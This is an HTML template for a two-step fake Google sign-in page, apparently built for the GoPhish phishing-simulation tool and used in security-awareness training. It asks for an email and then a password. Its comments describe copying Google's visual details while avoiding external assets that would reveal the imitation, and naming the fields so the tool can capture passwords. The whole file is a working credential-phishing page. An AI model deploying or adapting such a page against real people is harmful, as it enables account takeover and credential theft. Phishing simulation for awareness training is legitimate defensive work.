<!doctype html>
<html lang="{{idioma}}">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex, nofollow">
<title>{{tituloPagina}}</title>
<style>
  /* Recreación del inicio de sesión de Google. Escrita a mano en lugar de
     volcar el sitio real: no arrastra assets externos que delaten la visita
     al dominio original y se puede mantener sin depender de su markup. */

  * { box-sizing: border-box; }

  body {
    margin: 0;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 24px 16px;
    font-family: Arial, Helvetica, sans-serif;
    font-size: 14px;
    color: #202124;
    background-color: #ffffff;
  }

  .tarjeta {
    width: 100%;
    max-width: 450px;
    padding: 48px 40px 36px;
    border: 1px solid #dadce0;
    border-radius: 8px;
    text-align: center;
  }

  .marca-tenant { margin-bottom: 18px; min-height: 24px; }
  .marca-tenant img { max-width: 150px; max-height: 42px; display: block; margin: 0 auto; }

  /* Wordmark, no el icono: es lo que enseña la pantalla real de Google hoy. */
  .google-wordmark { margin: 0 0 16px; font-family: Arial, Helvetica, sans-serif; font-size: 24px; font-weight: 500; letter-spacing: -.5px; }
  .google-wordmark span:nth-child(1) { color: #4285f4; }
  .google-wordmark span:nth-child(2) { color: #ea4335; }
  .google-wordmark span:nth-child(3) { color: #fbbc05; }
  .google-wordmark span:nth-child(4) { color: #4285f4; }
  .google-wordmark span:nth-child(5) { color: #34a853; }
  .google-wordmark span:nth-child(6) { color: #ea4335; }

  h1 { margin: 0 0 8px; font-size: 24px; font-weight: 400; color: #202124; }
  .subtitulo { margin: 0 0 26px; font-size: 16px; color: #202124; }
  .aviso-privado { margin: 22px 0 0; font-size: 12px; line-height: 17px; color: #5f6368; text-align: left; }
  .aviso-privado a { color: #1a73e8; text-decoration: none; }

  .aviso {
    margin: 0 0 16px;
    font-size: 13px;
    line-height: 18px;
    color: #d93025;
    background: #fce8e6;
    padding: 10px 12px;
    border-radius: 4px;
  }
  .aviso:empty { display: none; padding: 0; }

  .identidad {
    display: flex;
    align-items: center;
    gap: 8px;
    margin-bottom: 20px;
    padding: 6px 12px;
    border: 1px solid #dadce0;
    border-radius: 20px;
    font-size: 14px;
    width: fit-content;
  }
  .volver { border: 0; background: none; padding: 0; cursor: pointer; color: #1a73e8; font-size: 16px; line-height: 1; }

  .grupo-campo { position: relative; margin-bottom: 22px; text-align: left; }
  /* Label flotante sobre el borde superior: el detalle Material Design que
     más distingue un formulario de Google a simple vista. */
  .grupo-campo label {
    position: absolute;
    top: -8px;
    left: 12px;
    padding: 0 4px;
    background: #ffffff;
    font-size: 12px;
    color: #1a73e8;
    font-weight: 500;
  }
  .campo {
    width: 100%;
    padding: 13px 15px;
    font-family: inherit;
    font-size: 16px;
    color: #202124;
    background: transparent;
    border: 1px solid #dadce0;
    border-radius: 4px;
    outline: none;
  }
  .campo:focus { border: 2px solid #1a73e8; padding: 12px 14px; }

  .error { margin: 6px 0 0; font-size: 12px; color: #d93025; text-align: left; }

  .enlaces { margin: 4px 0 28px; font-size: 14px; text-align: left; }
  .enlaces a { color: #1a73e8; text-decoration: none; font-weight: 500; }
  .enlaces a:hover { text-decoration: underline; }

  .acciones { display: flex; justify-content: space-between; align-items: center; }
  .crear-cuenta { color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; }

  .boton {
    padding: 10px 24px;
    font-family: inherit;
    font-size: 14px;
    font-weight: 500;
    color: #ffffff;
    background: #1a73e8;
    border: 1px solid #1a73e8;
    border-radius: 4px;
    cursor: pointer;
  }
  .boton:hover { background: #1765cc; border-color: #1765cc; }

  .pie {
    display: flex;
    justify-content: space-between;
    max-width: 450px;
    width: 100%;
    margin: 16px auto 0;
    padding: 0 4px;
    font-size: 12px;
    color: #5f6368;
  }
  .pie select { border: none; background: none; color: #5f6368; font-size: 12px; }
  .pie-enlaces { display: flex; gap: 22px; }
  .pie a { color: #5f6368; text-decoration: none; }

  .envoltorio { width: 100%; max-width: 450px; }
  .paso[hidden] { display: none; }

  @media (max-width: 480px) {
    body { padding: 0; }
    .tarjeta { max-width: none; border: 0; padding: 30px 22px; min-height: 100vh; }
    .pie { display: none; }
  }
</style>
</head>
<body>

<div class="envoltorio">
  <div class="tarjeta">

    <div class="marca-tenant">{{logoHtml}}</div>

    <div class="google-wordmark" aria-hidden="true" style="display:flex;align-items:center;gap:10px;"><svg style="display:block;height:28px;width:auto" xmlns="http://www.w3.org/2000/svg" height="24" viewBox="0 0 24 24" width="24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/><path d="M1 1h22v22H1z" fill="none"/></svg>
<span style="font-family:Arial,Helvetica,sans-serif;font-size:24px;color:#5f6368;">Google</span></div>

    <!--
      Un único formulario en dos pasos. Los campos se llaman exactamente
      "email" y "password": así es como GoPhish identifica la contraseña
      para poder descartarla cuando "Capture Passwords" está desmarcada.
    -->
    <form id="formulario" method="post" action="" autocomplete="off">

      <div class="paso" id="paso-email">
        <h1>{{tituloPaso1}}</h1>
        <p class="subtitulo">{{subtituloPaso1}}</p>
        <!--@bloque:aviso-sesion @senal:urgencia-->
        <p class="aviso">{{aviso}}</p>
        <!--@/bloque-->
        <div class="grupo-campo">
          <label for="email">{{phEmail}}</label>
          <input class="campo" type="email" id="email" name="email" required autofocus>
          <p class="error" id="error-email" hidden>{{errorEmail}}</p>
        </div>
        <!--@bloque:enlaces-ayuda @opcional-->
        <div class="enlaces"><a href="#">{{enlaceOlvidoEmail}}</a></div>
        <p class="aviso-privado">{{avisoPrivado}}</p>
        <!--@/bloque-->
        <div class="acciones">
          <a class="crear-cuenta" href="#">{{enlaceCrearCuenta}}</a>
          <button class="boton" type="button" id="btn-siguiente">{{btnSiguiente}}</button>
        </div>
      </div>

      <div class="paso" id="paso-password" hidden>
        <div class="identidad">
          <button class="volver" type="button" id="btn-volver" aria-label="{{btnVolver}}">&#8592;</button>
          <span id="eco-email"></span>
        </div>
        <h1>{{tituloPaso2}}</h1>
        <p class="subtitulo">{{subtituloPaso2}}</p>
        <div class="grupo-campo">
          <label for="password">{{phPassword}}</label>
          <input class="campo" type="password" id="password" name="password" required>
        </div>
        <div class="enlaces"><a href="#">{{enlaceOlvidoPassword}}</a></div>
        <div class="acciones">
          <span></span>
          <button class="boton" type="submit">{{btnEntrar}}</button>
        </div>
      </div>

    </form>
  </div>

  <div class="pie">
    <span>{{selectorIdioma}}</span>
    <!--@bloque:pie-legal @senal:!incoherencia-marca-->
    <div class="pie-enlaces">
      <a href="https://support.google.com/accounts" target="_blank" rel="noopener">{{enlaceAyuda}}</a>
      <a href="https://policies.google.com/privacy" target="_blank" rel="noopener">{{enlacePrivacidad}}</a>
      <a href="https://policies.google.com/terms" target="_blank" rel="noopener">{{enlaceCondiciones}}</a>
    </div>
    <!--@/bloque-->
  </div>
</div>

<script>
  (function () {
    var email = document.getElementById('email');
    var errorEmail = document.getElementById('error-email');
    var pasoEmail = document.getElementById('paso-email');
    var pasoPassword = document.getElementById('paso-password');
    var eco = document.getElementById('eco-email');

    function avanzar() {
      if (!email.value || email.value.indexOf('@') === -1) {
        errorEmail.hidden = false;
        email.focus();
        return;
      }
      errorEmail.hidden = true;
      eco.textContent = email.value;
      pasoEmail.hidden = true;
      pasoPassword.hidden = false;
      document.getElementById('password').focus();
    }

    document.getElementById('btn-siguiente').addEventListener('click', avanzar);
    email.addEventListener('keydown', function (e) { if (e.key === 'Enter') { e.preventDefault(); avanzar(); } });

    document.getElementById('btn-volver').addEventListener('click', function () {
      pasoPassword.hidden = true;
      pasoEmail.hidden = false;
      email.focus();
    });
  })();
</script>

</body>
</html>
